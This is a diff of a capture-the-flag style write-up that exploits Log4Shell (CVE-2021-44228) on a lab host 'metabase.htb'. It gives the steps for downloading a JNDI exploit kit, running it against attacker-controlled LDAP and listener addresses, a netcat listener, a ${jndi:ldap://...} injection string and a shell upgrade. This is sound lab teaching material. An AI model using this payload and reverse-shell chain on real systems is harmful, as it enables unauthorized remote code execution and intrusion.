@@ -4,51 +4,50 @@ Remote Code Execution vulnerability in apache Log4j2 ≤= 2.14.1
 Allows attackers to execute arbitrary system command by loading code from an attacker-controlled LDAP server via the Java Naming Directory Interface JNDI reported by [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
 
 ## TL:DR
-find **user** and **root flag** trough remote code execution. Therefore use this  [exploit](https://github.com/pimps/JNDI-Exploit-Kit/) and setup `netcat`.  
+find **user** and **root flag** trough remote code execution. Therefore use this  [exploit](https://github.com/pimps/JNDI-Exploit-Kit/) and setup `netcat` using kali linux as our OS.  
 ## getting started
 We add the `domain` and `ip` to `/etc/hosts` .
 ```
 echo "10.10.69.123 metabase.htb" | sudo tee -a /etc/hosts
 ```
 ## enumeration
-As we start with a `nmap` scan it revails a `nginx server` is listening on default port 80 and we are redireted to `metabase.htb` .
+As we start with a `nmap` scan it revails a `nginx server` listening on port 80 and we are redireted to `metabase.htb` .
 
-
-We look for something interesting in source code with `curl`
+We also look for something interesting in source code with `curl`
 ```sh
 curl -v metabase.htb
 ```
 
 
 ## Expliotation
-We found the information here for `JNDI injections` vulnerabilities. Public expliots are available. We look for  a suitable [exploit](https://github.com/pimps/JNDI-Exploit-Kit/) and download the available compiled version to our attacking machine:
+We found the information here for `JNDI injections` vulnerabilities. Public expliots are available. We look for  a suitable [exploit](https://github.com/pimps/JNDI-Exploit-Kit/) and download the available compiled version to our kali linux:
 ```sh
 wget https://github.com/pimps/JNDI-Exploit-Kit/raw/master/target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar
 ```
 
-Now we run the exploit by specifiying the LDAP server adress `IP:port` with the `-L` option and the adress of our listener with the `-S` option:
+Now we can run the exploit by specifiying the LDAP server adress `IP:port` with the `-L` option and the adress of our listener with the `-S` option:
 
 ```sh
 java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L 10.10.14.7:1389 -S 10.10.14.22:4444
 ```
 
 ## Privilege Escalation
-Getting prepared for privilege escalation we have to setup `netcat` to listen on port `4444`.
+Getting prepared for privilege escalation we have to setup `netcat` and we listen on port `4444`.
 ```sh
 nc -lvnp 4444
 ```
 
 We pick the LDAP payload targeting with `trustURLCodebase=true` and type the following string to the Native query Matabase page
 
-NOTE: While suggesting otherwise the option `JDK 1.8`  was not working for me.
+NOTE: While suggesting otherwise the option `JDK 1.8` was not working for me.
 
-We add new query in sample data
+We add a query in `sample data`:
 ```sh
 ${jndi:ldap://10.10.14.7:1389/57sbhf}
 ```
-![db query](img/db_query.png)
+![db query](../img/db_query.png)
 
-We see in our terminal a succesfull privilege escalation en try to upgrade our shell to a fully interactive pty. Due to the fact `python3` is installed on the host, we run:
+Now we see in our terminal a succesfull privilege escalation en try to upgrade our shell to a fully interactive pty. Due to the fact `python3` is installed on the host, we run:
 ```sh
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
